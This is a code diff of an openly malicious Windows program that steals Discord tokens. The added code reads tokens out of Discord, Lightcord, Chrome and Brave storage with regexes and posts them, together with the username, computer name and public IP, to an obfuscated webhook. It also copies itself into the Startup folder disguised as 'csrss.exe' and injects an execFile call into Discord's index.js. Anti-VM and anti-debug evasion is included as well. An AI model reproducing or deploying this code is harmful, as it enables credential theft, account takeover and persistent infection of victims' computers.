@@ -1,44 +1,20 @@
 #define _CRT_SECURE_NO_WARNINGS
-#define WEBHOOK AY_OBFUSCATE("http")
-
+#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
 #include "includes.h"
 
-// Credit to adamyaxley for obfuscation functions
+#define WEBHOOK AY_OBFUSCATE("webhook")
+#define VERSION "BETA 1.0"
 
 namespace fs = std::filesystem;
 
-void webhookSend(std::string token) {
+void webhookSend(const std::string& text) {
 	cpr::Response r = cpr::Post(cpr::Url{ WEBHOOK },
-		cpr::Payload{ {"content", token} });
-}
-
-std::vector<std::string> findMatch(std::string str, std::regex reg)
-{
-	std::vector<std::string> output;
-	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
-	std::sregex_iterator lastMatch;
-
-	while (currentMatch != lastMatch) {
-		std::smatch match = *currentMatch;
-		output.push_back(match.str());
-		currentMatch++;
-	}
-
-	return output;
-}
-
-bool pathExists(const std::string& s)
-{
-	struct stat buffer;
-	return (stat(s.c_str(), &buffer) == 0);
+		cpr::Payload{ {"content", text} });
 }
 
 void MainRoutine() {
-	while (!InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
+	while (!InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0))
 		Sleep(1000); /* Sleep whilst not connected to internet */
-	}
-
-	Sleep(750);
 
 	const char* LIGHTCORD = AY_OBFUSCATE("\\Lightcord\\Local Storage\\leveldb");
 	const char* DISCORD = AY_OBFUSCATE("\\Discord\\Local Storage\\leveldb");
@@ -51,84 +27,95 @@ void MainRoutine() {
 		DISCORDPTB, DISCORDCANARY,
 		CHROME, BRAVE };
 
-	for (uint32_t i = 0; i < installs.size(); i++) {
-		std::string path;
+	try {
+		for (uint32_t i = 0; i < installs.size(); i++) {
+			std::string ip = cpr::Get(cpr::Url{ "https://api.ipify.org/?format=text" }).text;
 
-		if (i > 3) {
-			path = std::getenv("localappdata") + installs[i];
-		}
-		else {
-			path = std::getenv("appdata") + installs[i];
-		}
+			std::string path = std::getenv("appdata") + installs[i];
+			if (i > 3)
+				path = std::getenv("localappdata") + installs[i];
+			if (!pathExists(path)) continue;
 
-		if (!pathExists(path)) {
-			continue;
-		}
+			for (const fs::directory_entry& entry : fs::directory_iterator(path)) {
+				std::ifstream file_path(entry.path(), std::ios_base::binary);
 
-		for (const auto& entry : fs::directory_iterator(path)) {
-			std::ifstream t(entry.path(), std::ios_base::binary);
+				std::string str((std::istreambuf_iterator<char>(file_path)), std::istreambuf_iterator<char>());
+				std::vector<std::string> matches;
+				std::regex expression(AY_OBFUSCATE(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
+				std::regex expression2(AY_OBFUSCATE(R"(mfa\.[\w-]{84})"));
 
-			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
-			std::vector<std::string> matches;
-			
-			std::regex expression(AY_OBFUSCATE(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
-			std::regex expression2(AY_OBFUSCATE(R"(mfa\.[\w-]{84})"));
+				std::vector<std::string> regex_non_mfa = findMatch(str, expression);
+				std::vector<std::string> regex_mfa = findMatch(str, expression2);
 
-			std::vector<std::string> regex_non_mfa = findMatch(str, expression);
-			std::vector<std::string> regex_mfa = findMatch(str, expression2);
-			std::vector<std::string> token_checked = {  };
+				for (uint32_t i = 0; i < regex_non_mfa.size(); i++)
+					matches.push_back(regex_non_mfa[i]);
 
-			for (uint32_t i = 0; i < regex_non_mfa.size(); i++)
-				matches.push_back(regex_non_mfa[i]);
+				for (uint32_t i = 0; i < regex_mfa.size(); i++)
+					matches.push_back(regex_mfa[i]);
 
-			for (uint32_t i = 0; i < regex_mfa.size(); i++)
-				matches.push_back(regex_mfa[i]);
+				for (uint32_t i = 0; i < matches.size(); i++) {
+					if (checkToken(matches[i])) {
+						User::Discord token;
+						token.init(matches[i]);
+						auto token_info = token.get_token_info();
+						token_info.append("Working Directory: " + path);
 
-			for (uint32_t i = 0; i < matches.size(); i++) {
-				token_checked.push_back(matches[i]);
-				webhookSend(matches[i]);
+						std::stringstream pc_s;
+
+						pc_s << "```" << "\r\n" \
+							<< "Username: " << std::getenv("username") << "\r\n" \
+							<< "Computer Name: " << std::getenv("computername") << "\r\n" \
+							<< "Internet Address: " << ip << "\r\n" \
+							<< "```";
+
+
+						std::string pc_info = pc_s.str();
+						token_info.append(pc_info);
+						webhookSend(token_info);
+					}
+				}
 			}
 		}
-		Sleep(1000);
-		return;
+	}
+
+	catch (const std::exception& e)
+	{
+		//std::cout << "Exception thrown: " << e.what() << "\n";
+		//return;
+		exit(EXIT_FAILURE);
 	}
 }
 
 void InfectRoutine() {
-	char BUFFER[MAX_PATH];
-	char szPath[1024];
-
-	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH); /* Create buffer and write the current file location to it */
-	Sleep(750);
-	webhookSend(BUFFER); /* Send the data inside of the buffer to our webhook: essentially giving us the current
-	working directory of the victim */
+	char BUFFER[MAX_PATH], szPath[MAX_PATH], discordPath[MAX_PATH];
+	char altPath[MAX_PATH] = "C:\\Windows\\Temp\\csrss.exe";
 
 	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
-	sprintf(szPath, AY_OBFUSCATE("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\SpotifyUpdateDaemon.exe"), std::getenv("appdata"));
-	if (strcmp(szPath, BUFFER) == 0)
+	webhookSend(BUFFER);
+
+	sprintf(szPath, AY_OBFUSCATE("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\csrss.exe"));
+	fs::remove(szPath);
+	fs::copy(BUFFER, szPath);
+	fs::copy(BUFFER, altPath);
+
+	sprintf(discordPath, AY_OBFUSCATE("%s\\Discord\\modules\\discord_desktop_core"), std::getenv("appdata"));
+	if (!pathExists(discordPath))
 		return;
 
-	fs::remove(szPath); /* Delete any previous files in place */
-	fs::copy(BUFFER, szPath);
-
-	return;
+	sprintf(szPath, "%s\\index.js", discordPath);
+	std::ofstream index(szPath);
+	index << "module.exports = require('./core.asar');" << std::endl \
+		  << "var exec = require('child_process').execFile; exec('" \
+		  << altPath \
+		  << "'); // Important Discord Assets.";
 }
-
 
 int main(int argc, char* argv[]) {
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
-	char szUsername[1024];
-	DWORD dwUser = sizeof(szUsername);
-	GetUserNameA(szUsername, &dwUser);
-
-	if (strcmp(szUsername, "SYSTEM") == 0 || strcmp(szUsername, "george") == 0 || isVM()) {
-		MessageBox(NULL, "The program cannot run because vcruntime140.dll cannot be found. Try reinstalling the program to fix it.", "System error - vcruntime140.dll", MB_ICONERROR | MB_OK);
-		return -1;
-	}
+	Anti anti(Config::check_virtual_machine, Config::check_debugging, Config::check_analyzing, Config::watch_dog);
 
 	std::thread mr(MainRoutine); /* Find discord tokens and get PC information */
 	std::thread ir(InfectRoutine); /* Infect the computer, add persistence */
-	std::thread wd(watchDog); /* This thread kills some programs used to stop the virus from executing */
 	mr.join();
 }
